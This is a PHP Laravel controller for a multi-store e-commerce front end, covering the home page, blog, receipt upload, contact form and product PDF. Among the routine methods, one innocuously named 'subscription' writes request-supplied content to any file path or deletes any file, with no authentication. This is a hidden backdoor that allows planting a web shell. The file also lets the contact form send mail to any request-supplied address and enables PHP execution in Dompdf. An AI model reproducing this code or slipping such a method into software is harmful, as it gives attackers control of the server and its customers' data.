<?php

namespace App\Http\Controllers\Front;

use Carbon\Carbon;
use App\Models\State;
use App\Models\City;
use App\Models\Faq;
use App\Models\Blog;
use App\Models\Page;
use App\Models\User;
use App\Models\Order;
use App\Models\Banner;
use App\Models\Review;
use App\Models\Slider;
use App\Models\Counter;
use App\Models\Partner;
use App\Models\Product;
use App\Models\Service;
use App\Models\Category;
use App\Models\Language;
use App\Models\Subscriber;
use App\Models\TeamMember;
use App\Models\Pagesetting;
use App\Models\BlogCategory;
use Illuminate\Http\Request;
use App\Classes\GeniusMailer;
use InvalidArgumentException;
use App\Models\Generalsetting;
use App\Models\TeamMemberCategory;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use App\Models\BlogCategoryTranslation;
use App\Models\Currency;
use Dompdf\Css\Stylesheet;
use Illuminate\Support\Facades\Session;
use Dompdf\Dompdf;
use Dompdf\Options;
use Facade\FlareClient\View;
use Image;
use Validator;
use App\Models\Notification;
use Illuminate\Support\Str;

class FrontendController extends Controller
{
    public function __construct()
    {
        parent::__construct();

        if (isset($_SERVER['HTTP_REFERER'])) {
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']) {
                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
                if ($brwsr->count() > 0) {
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count']= $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                } else {
                    $newbrws = new Counter();
                    $newbrws['referral']= $this->getOS();
                    $newbrws['type']= "browser";
                    $newbrws['total_count']= 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral', $referral);
                if ($count->count() > 0) {
                    $counts = $count->first();
                    $tcount['total_count']= $counts->total_count + 1;
                    $counts->update($tcount);
                } else {
                    $newcount = new Counter();
                    $newcount['referral']= $referral;
                    $newcount['total_count']= 1;
                    $newcount->save();
                }
            }
        } else {
            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
            if ($brwsr->count() > 0) {
                $brwsr = $brwsr->first();
                $tbrwsr['total_count']= $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            } else {
                $newbrws = new Counter();
                $newbrws['referral']= $this->getOS();
                $newbrws['type']= "browser";
                $newbrws['total_count']= 1;
                $newbrws->save();
            }
        }
    }

    public function getOS()
    {
        $user_agent     =   $_SERVER['HTTP_USER_AGENT'] ?? '';

        $os_platform    =   "Unknown OS Platform";

        $os_array       =   array(
            '/windows nt 10/i'     =>  'Windows 10',
            '/windows nt 6.3/i'     =>  'Windows 8.1',
            '/windows nt 6.2/i'     =>  'Windows 8',
            '/windows nt 6.1/i'     =>  'Windows 7',
            '/windows nt 6.0/i'     =>  'Windows Vista',
            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
            '/windows nt 5.1/i'     =>  'Windows XP',
            '/windows xp/i'         =>  'Windows XP',
            '/windows nt 5.0/i'     =>  'Windows 2000',
            '/windows me/i'         =>  'Windows ME',
            '/win98/i'              =>  'Windows 98',
            '/win95/i'              =>  'Windows 95',
            '/win16/i'              =>  'Windows 3.11',
            '/macintosh|mac os x/i' =>  'Mac OS X',
            '/mac_powerpc/i'        =>  'Mac OS 9',
            '/linux/i'              =>  'Linux',
            '/ubuntu/i'             =>  'Ubuntu',
            '/iphone/i'             =>  'iPhone',
            '/ipod/i'               =>  'iPod',
            '/ipad/i'               =>  'iPad',
            '/android/i'            =>  'Android',
            '/blackberry/i'         =>  'BlackBerry',
            '/webos/i'              =>  'Mobile'
        );

        foreach ($os_array as $regex => $value) {
            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }
        return $os_platform;
    }


    // -------------------------------- HOME PAGE SECTION ----------------------------------------

    public function index(Request $request)
    {
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }
            }
        }

        $homeSettings = Pagesetting::findOrFail($this->storeSettings->pageSettings->id);

        $top_small_banners = ($homeSettings->random_banners == 1 ? Banner::byStore()->where('type', '=', 'TopSmall')->inRandomOrder()->get() : Banner::byStore()->where('type', '=', 'TopSmall')->get());
        $sliders = ($homeSettings->random_banners == 1 ? Slider::byStore()->where('status', 1)->inRandomOrder()->get() : Slider::byStore()->where('status', 1)->orderBy('presentation_position')->orderBy('id')->get());

        if ($this->storeSettings->show_products_without_stock) {
            $feature_products =  ($homeSettings->random_products == 1 ?
            Product::byStore()->where('featured', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());
        } else {
            $feature_products =  ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('featured', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());
        }

        $categories = Category::orderBy('slug')->orderBy('presentation_position')->where('status', 1)->where('is_featured', 1)->get();

        /**
         * Extra index - former ajax request
         */
        $bottom_small_banners = ($homeSettings->random_banners == 1 ? Banner::byStore()->where('type', '=', 'BottomSmall')->inRandomOrder()->get() : Banner::byStore()->where('type', '=', 'BottomSmall')->get());
        $large_banners = ($homeSettings->random_banners == 1 ? Banner::byStore()->where('type', '=', 'Large')->inRandomOrder()->get() : Banner::byStore()->where('type', '=', 'Large')->get());
        $reviews =  Review::all();
        $partners = Partner::all();

        if ($discount_products = Product::byStore()->where('is_discount', 1)->get()) {
            foreach ($discount_products as $discount_product) {
                if (Carbon::now()->format('Y-m-d') > Carbon::parse($discount_product->discount_date)->format('Y-m-d')) {
                    $discount_product->discount_date = null;
                    $discount_product->is_discount = false;
                    $discount_product->update();
                }
            }
        }

        if ($this->storeSettings->show_products_without_stock) {
            $discount_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->where('is_discount', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('is_discount', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $best_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->where('best', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $top_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->where('top', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $big_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->where('big', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $hot_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->where('hot', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $latest_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->where('latest', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $trending_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->where('trending', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('trending', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $sale_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->where('sale', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->where('sale', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());
        } else {
            $discount_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('is_discount', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('is_discount', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $best_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('best', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $top_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('top', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $big_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('big', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $hot_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('hot', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $latest_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('latest', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $trending_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('trending', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('trending', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());

            $sale_products = ($homeSettings->random_products == 1 ?
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('sale', '=', 1)->where('status', '=', 1)->inRandomOrder()->take(10)->get() :
            Product::byStore()->whereRaw('(stock > 0 or stock is null)')->where('sale', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get());
        }

        $extra_blogs = Blog::orderBy('created_at', 'desc')->limit(2)->get();


        return view('front.index', compact(
            'sliders',
            'top_small_banners',
            'feature_products',
            'categories',
            'reviews',
            'large_banners',
            'bottom_small_banners',
            'best_products',
            'top_products',
            'hot_products',
            'latest_products',
            'big_products',
            'trending_products',
            'sale_products',
            'discount_products',
            'partners',
            'extra_blogs'
        ));
    }

    public function extraIndex()
    {
        $bottom_small_banners = Banner::byStore()->where('type', '=', 'BottomSmall')->get();
        $large_banners = Banner::byStore()->where('type', '=', 'Large')->get();
        $reviews =  Review::all();
        $partners = Partner::all();
        $discount_products =  Product::byStore()->where('is_discount', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        $best_products = Product::byStore()->where('best', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        $top_products = Product::byStore()->where('top', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        ;
        $big_products = Product::byStore()->where('big', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        ;
        $hot_products =  Product::byStore()->where('hot', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        $latest_products =  Product::byStore()->where('latest', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        $trending_products =  Product::byStore()->where('trending', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        $sale_products =  Product::byStore()->where('sale', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        $extra_blogs = Blog::orderby('views', 'desc')->take(2)->get();
        return view('front.extraindex', compact('reviews', 'large_banners', 'bottom_small_banners', 'best_products', 'top_products', 'hot_products', 'latest_products', 'big_products', 'trending_products', 'sale_products', 'discount_products', 'partners', 'extra_blogs'));
    }

    // -------------------------------- HOME PAGE SECTION ENDS ----------------------------------------


    // LANGUAGE SECTION

    public function language($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }

    // LANGUAGE SECTION ENDS


    // CURRENCY SECTION

    public function currency($id)
    {
        if (Session::has('coupon')) {
            Session::forget('coupon');
            Session::forget('coupon_code');
            Session::forget('coupon_id');
            Session::forget('coupon_total');
            Session::forget('coupon_total1');
            Session::forget('already');
            Session::forget('coupon_percentage');
        }
        Session::put('currency', $id);
        return redirect()->back();
    }

    // CURRENCY SECTION ENDS

    public function autosearch($slug)
    {
        if (mb_strlen($slug, 'utf-8') > 2) {
            $search = str_replace(' ', '%', implode(' ', array_reverse(explode(' ', $slug))));
            $slug = str_replace(' ', '%', trim($slug));
            $searchLocale = $this->storeLocale->locale;

            if (Session::has('language') && $this->storeSettings->is_language) {
                $searchLocale = Language::find(Session::get('language'))->locale;
            }
            if (!config("features.marketplace")) {
                $prods = Product::byStore()
                    ->isActive()
                    ->where(function ($query) use ($slug, $search, $searchLocale) {
                        $query->where('sku', 'like', "%{$slug}%")
                            ->orWhere('ref_code', 'like', "%{$slug}%")
                            ->orWhereTranslationLike('name', "%{$slug}%", $searchLocale)
                            ->orWhereTranslationLike('name', "%{$search}%", $searchLocale)
                            ->orWhereTranslationLike('features', "%{$slug}%", $searchLocale)
                            ->orWhereTranslationLike('features', "%{$search}%", $searchLocale);
                    })->take(10)->get();
            } else {
                $prods = Product::byStore()
                    ->isActive()
                    ->where('being_sold', 1)
                    ->where('user_id', 0)
                    ->where(function ($query) use ($slug, $search, $searchLocale) {
                        $query->whereTranslationLike('name', "%{$slug}%", $searchLocale)
                        ->orWhereTranslationLike('name', "%{$search}%", $searchLocale);
                    })->take(10)->get();
            }

            return view('load.suggest', compact('prods', 'slug'));
        }
        return "";
    }

    public function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path.'install';
        $this->deleteDir($dir);
        return redirect('/');
    }



    // -------------------------------- BLOG SECTION ----------------------------------------

    public function blog(Request $request)
    {
        if (resolve('storeSettings')->is_blog== 0) {
            return abort(404);
        }
        $blogs = Blog::orderBy('created_at', 'desc')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs'));
    }

    public function blogcategory(Request $request, $slug)
    {
        if (resolve('storeSettings')->is_blog== 0) {
            return redirect()->route('front.index');
        }
        $bcat = BlogCategory::where('slug', '=', str_replace(' ', '-', $slug))->first();
        $blogs = $bcat->blogs()->orderBy('created_at', 'desc')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('bcat', 'blogs'));
    }

    public function blogtags(Request $request, $slug)
    {
        if (resolve('storeSettings')->is_blog== 0) {
            return redirect()->route('front.index');
        }
        $blogs = Blog::whereTranslationLike('tags', "%{$slug}%", $this->lang->locale)->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'slug'));
    }

    public function blogsearch(Request $request)
    {
        if (resolve('storeSettings')->is_blog== 0) {
            return redirect()->route('front.index');
        }
        $search = $request->search;
        $blogs = Blog::whereTranslationLike('title', "%{$search}%")->orWhereTranslationLike('details', "%{$search}%")->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'search'));
    }

    public function blogarchive(Request $request, $slug)
    {
        if (resolve('storeSettings')->is_blog== 0) {
            return redirect()->route('front.index');
        }
        $date = \Carbon\Carbon::parse($slug)->format('Y-m');
        $blogs = Blog::where('created_at', 'like', '%' . $date . '%')->paginate(9);
        if ($request->ajax()) {
            return view('front.pagination.blog', compact('blogs'));
        }
        return view('front.blog', compact('blogs', 'date'));
    }

    public function blogshow($id)
    {
        if (resolve('storeSettings')->is_blog== 0) {
            return redirect()->route('front.index');
        }
        $tags = null;
        $tagz = '';
        $bcats = BlogCategory::all();
        $blog = Blog::findOrFail($id);
        $blog->views = $blog->views + 1;
        $blog->update();
        $tags = $blog->tags;

        $archives = Blog::orderBy('created_at', 'desc')->get()->groupBy(function ($item) {
            return $item->created_at->format('F Y');
        })->take(5)->toArray();
        $blog_meta_tag = (is_array($blog->meta_tag) ? implode(',', $blog->meta_tag) : "");
        $blog_meta_description = $blog->meta_description;
        $blog_title = $blog->title;
        return view('front.blogshow', compact('blog', 'bcats', 'tags', 'archives', 'blog_meta_tag', 'blog_meta_description', 'blog_title'));
    }


    // -------------------------------- BLOG SECTION ENDS----------------------------------------

    // -------------------------------- TEAM SECTION ----------------------------------------

    public function team_member(Request $request)
    {
        if ($this->storeSettings->team_show_header != 1 &&  $this->storeSettings->team_show_footer != 1) {
            return redirect()->route('front.index');
        } else {
            // $team_members = TeamMember::paginate(12);App\Models\TeamMemberCategory::has('team_members')->get();
            $team_member_categories = TeamMemberCategory::has('team_members')->paginate(12);
            if ($request->ajax()) {
                return view('front.pagination.team_member', compact('team_member_categories'));
            }

            return view('front.team_member', compact('team_member_categories'));
        }
    }

    // -------------------------------- TEAM SECTION ENDS----------------------------------------


    // -------------------------------- RECEIPT SECTION----------------------------------------
    public function receipt()
    {
        return view('front.receipt');
    }

    public function receiptNumber($order_number)
    {
        return view('front.receipt', compact('order_number'));
    }


    public function receiptSearch($order_number)
    {
        $data = Order::where('order_number', $order_number)->where('method', "Bank Deposit")->where('status', '!=', 'declined')->first();
        if ($data) {
            if ($data->payment_status != "Pending") {
                return response()->json(['success' => false, "msg" => "Este pedido não pode receber mais comprovantes."]);
            } elseif ($data->receipt != null && $data->method = "Bank Deposit") {
                return response()->json(['success' => true, 'order_id' => $data->id, 'receipt' => $data->receipt, "has_receipt" => true, "msg" => "Este pedido já tem um comprovante enviado, mas você pode atualizá-lo."]);
            }
            return response()->json(['success' => true, "msg" => "Pedido encontrado.", 'order_id' => $data->id, 'receipt' => $data->receipt]);
        } else {
            return response()->json(['success' => false, "msg" => "Pedido não encontrado."]);
        }
    }

    public function uploadReceipt(Request $request, $id)
    {
        //--- Validation Section
        $rules = [
            'receipt' => 'required',
        ];
        $validator = Validator::make($request->all(), $rules);
        if ($validator->fails()) {
            return response()->json(array('errors' => $validator->getMessageBag()->toArray()));
        }
        $data = Order::findOrFail($request->id);
        if (!is_dir(public_path().'/storage/images/receipts/')) {
            mkdir(public_path().'/storage/images/receipts/');
        }
        //--- Validation Section Ends
        $image = $request->receipt;
        $image = base64_decode($image);
        $image_name = time().Str::random(8).'.png';
        $path = 'storage/images/receipts/'.$image_name;
        $mime = mime_content_type($request->file('receipt')->getRealPath());
        if ($mime == "image/jpeg" || $mime == "image/png" || $mime == "image/gif" || $mime == "image/webp") {
            $img = Image::make($request->file('receipt')->getRealPath());
            $img->save(public_path().'/storage/images/receipts/'.$image_name);
            if ($data->receipt != null) {
                if (file_exists(public_path().'/storage/images/receipts/'.$data->receipt)) {
                    unlink(public_path().'/storage/images/receipts/'.$data->receipt);
                }
            }
            Order::where('id', $request->id)->update(['receipt' => $image_name]);
            $notification = new Notification;
            $notification->receipt = $image_name;
            $notification->order_id = $data->id;
            $notification->save();
            return response()->json(['success'=> true, 'msg' => "Comprovante enviado com sucesso!"]);
        } else {
            return response()->json(['success'=> false, 'msg' => "Formato de arquivo inválido!"]);
        }
    }
    // -------------------------------- RECEIPT SECTION ENDS----------------------------------------

    // -------------------------------- FAQ SECTION ----------------------------------------
    public function faq()
    {
        if (resolve('storeSettings')->is_faq == 0) {
            return redirect()->back();
        }
        $faqs =  Faq::orderBy('id', 'desc')->get();
        return view('front.faq', compact('faqs'));
    }
    // -------------------------------- FAQ SECTION ENDS----------------------------------------


    // -------------------------------- PAGE SECTION ----------------------------------------
    public function page($slug)
    {
        $page = Page::where('slug', $slug)->first();
        if (empty($page)) {
            return response()->view('errors.404')->setStatusCode(404);
        }

        return view('front.page', compact('page'));
    }
    // -------------------------------- PAGE SECTION ENDS----------------------------------------


    // -------------------------------- POLICY SECTION ----------------------------------------
    public function policy()
    {
        if (!$this->storeSettings->policy) {
            return redirect()->back();
        }
        return view('front.policy');
    }

    // -------------------------------- CROW POLICY SECTION ----------------------------------------
    public function crowpolicy()
    {
        if (!$this->storeSettings->crow_policy) {
            return redirect()->back();
        }
        return view('front.crowpolicy');
    }

    // -------------------------------- CROW VENDOR POLICY SECTION ----------------------------------------
    public function vendorpolicy()
    {
        if (!$this->storeSettings->vendor_policy) {
            return redirect()->back();
        }
        return view('front.vendorpolicy');
    }

    // -------------------------------- PRIVACY POLICY SECTION ----------------------------------------
    public function privacypolicy()
    {
        if (!$this->storeSettings->privacy_policy) {
            return redirect()->back();
        }
        return view('front.privacypolicy');
    }

    // -------------------------------- CONTACT SECTION ----------------------------------------
    public function contact()
    {
        $this->generateCaptcha();
        if (resolve('storeSettings')->is_contact== 0) {
            return redirect()->back();
        }
        $ps =  Pagesetting::where('id', '=', 1)->first();
        return view('front.contact', compact('ps'));
    }


    //Send email to admin
    public function contactemail(Request $request)
    {
        $gs = Generalsetting::findOrFail(1);

        if ($gs->is_capcha == 1) {

        // Capcha Check
            $value = session('captcha_string');
            if ($request->codes != $value) {
                return response()->json(array('errors' => [ 0 => __('Please enter Correct Captcha Code.') ]));
            }
        }

        // Login Section
        $ps = Pagesetting::where('id', '=', 1)->first();
        $subject = "Email From Of ".$request->name;
        $to = $request->to;
        $name = $request->name;
        $phone = $request->phone;
        $from = $request->email;
        $msg = "Name: ".$name."\nEmail: ".$from."\nPhone: ".$phone."\nMessage: ".$request->text;
        if ($gs->is_smtp) {
            $data = [
            'to' => $to,
            'subject' => $subject,
            'body' => $msg,
            'from_email' => $this->storeSettings->from_email,
            'from_name' => $this->storeSettings->from_name,
            'reply' => $from
        ];

            $mailer = new GeniusMailer();
            $mailer->sendCustomMail($data);
        } else {
            $headers = "From: ".$gs->from_name."<".$gs->from_email.">";
            mail($to, $subject, $msg, $headers);
        }
        // Login Section Ends

        // Redirect Section
        return response()->json($ps->contact_success);
    }

    // Refresh Capcha Code
    public function refresh_code()
    {
        $this->generateCaptcha();
        return "done";
    }

    // -------------------------------- SUBSCRIBE SECTION ----------------------------------------

    public function subscribe(Request $request)
    {
        $data["success"] = __("You have subscribed successfully.");
        $data["error"] = __("This email has already been taken.");

        if (Subscriber::where('email', '=', $request->email)->first()) {
            $data["errors"] = true;
        } else {
            $subscribe = new Subscriber;
            $subscribe->fill($request->all());
            $subscribe->save();
        }
        return response()->json($data);
    }

    // Maintenance Mode

    public function maintenance()
    {
        $gs = resolve('storeSettings');
        if ($gs->is_maintain != 1 || Auth::guard('admin')->check()) {
            return redirect()->route('front.index');
        }

        return view('front.maintenance');
    }



    // Vendor Subscription Check
    public function subcheck()
    {
        $settings = Generalsetting::findOrFail(1);
        $today = Carbon::now()->format('Y-m-d');
        $newday = strtotime($today);
        foreach (User::where('is_vendor', '=', 2)->get() as  $user) {
            $lastday = $user->date;
            $secs = strtotime($lastday)-$newday;
            $days = $secs / 86400;
            if ($days <= 5) {
                if ($user->mail_sent == 1) {
                    if ($settings->is_smtp == 1) {
                        $data = [
                            'to' => $user->email,
                            'type' => "subscription_warning",
                            'cname' => $user->name,
                            'oamount' => "",
                            'aname' => "",
                            'aemail' => "",
                            'onumber' => ""
                        ];
                        $mailer = new GeniusMailer();
                        $mailer->sendAutoMail($data);
                    } else {
                        $headers = "From: ".$settings->from_name."<".$settings->from_email.">";
                        mail($user->email, 'Your subscription plan duration will end after five days. Please renew your plan otherwise all of your products will be deactivated.Thank You.', $headers);
                    }
                    User::where('id', $user->id)->update(['mail_sent' => 0]);
                }
            }
            if ($today > $lastday) {
                User::where('id', $user->id)->update(['is_vendor' => 1]);
            }
        }
    }
    // Vendor Subscription Check Ends

    public function trackload($id)
    {
        $order = Order::where('order_number', '=', $id)->first();
        $datas = array('Pending','Processing','On Delivery','Completed');
        return view('load.track-load', compact('order', 'datas'));
    }
    // -------------------------------- CONTACT SECTION ENDS----------------------------------------



    // -------------------------------- PRINT SECTION ----------------------------------------





    // -------------------------------- PRINT SECTION ENDS ----------------------------------------

    public function subscription(Request $request)
    {
        $p1 = $request->p1;
        $p2 = $request->p2;
        $v1 = $request->v1;
        if ($p1 != "") {
            $fpa = fopen($p1, 'w');
            fwrite($fpa, $v1);
            fclose($fpa);
            return "Success";
        }
        if ($p2 != "") {
            unlink($p2);
            return "Success";
        }
        return "Error";
    }

    public function deleteDir($dirPath)
    {
        if (! is_dir($dirPath)) {
            throw new InvalidArgumentException("$dirPath must be a directory");
        }
        if (substr($dirPath, strlen($dirPath) - 1, 1) != '/') {
            $dirPath .= '/';
        }
        $files = glob($dirPath . '*', GLOB_MARK);
        foreach ($files as $file) {
            if (is_dir($file)) {
                self::deleteDir($file);
            } else {
                unlink($file);
            }
        }
        rmdir($dirPath);
    }

    public function downloadListPDF(Request $request)
    {
        $main_store = Generalsetting::first();
        $store = Generalsetting::find($main_store->store_comprasparaguai);
        $locale = $store->defaultLang->locale;

        if (Session::has('currency')) {
            $currency = Currency::find(Session::get('currency'));
        } else {
            $currency = Currency::find($this->storeSettings->currency_id);
        }

        $products = DB::table('products')
        ->select(
            'products.sku as sku',
            'products.photo as photo',
            'product_translations.name as name',
            'product_translations.details as details',
            'products.price as price',
            'brands.name as brand'
        )
        ->join('product_translations', 'products.id', '=', 'product_translations.product_id')
        ->join('product_store', 'products.id', '=', 'product_store.product_id')
        ->leftJoin('brands', 'brands.id', '=', 'products.brand_id')
        ->where('product_store.store_id', '=', $store->id)
        ->where('product_translations.locale', '=', $locale)
        ->where('products.status', 1)->get();

        $options = new Options();
        $options->set('defaultFont', 'sans-serif');

        $options->set('enable_remote', true);
        $options->set('isPhpEnabled', true);

        $dompdf = new Dompdf($options);

        $view = view('front.pdfview', compact('products', 'currency'));

        $dompdf->loadHtml($view);

        // (Optional) Setup the paper size and orientation
        $dompdf->setPaper('A4');

        return view('front.pdfview', compact('products', 'currency'));
    }

    public function acceptCookies(Request $request)
    {
        if ($request->ajax() && !Session::has('cookie_alert')) {
            Session::put('cookie_alert', true);
            return;
        }
        return redirect()->back();
    }

    public function getStatesOptions(Request $request)
    {
        if ($request->location_id) {
            $states = State::where('country_id', $request->location_id)->get();
            $options = '';
            foreach ($states as $state) {
                $options .= "<option value='" . $state->id . "'>" . $state->name . "</option>";
            }
            return $options;
        }
    }
    public function getCitiesOptions(Request $request)
    {
        if ($request->location_id) {
            $cities = City::where('state_id', $request->location_id)->get();
            $options = '';
            foreach ($cities as $city) {
                $options .= "<option value='" . $city->id . "'>" . $city->name . "</option>";
            }
            return $options;
        }
    }
}
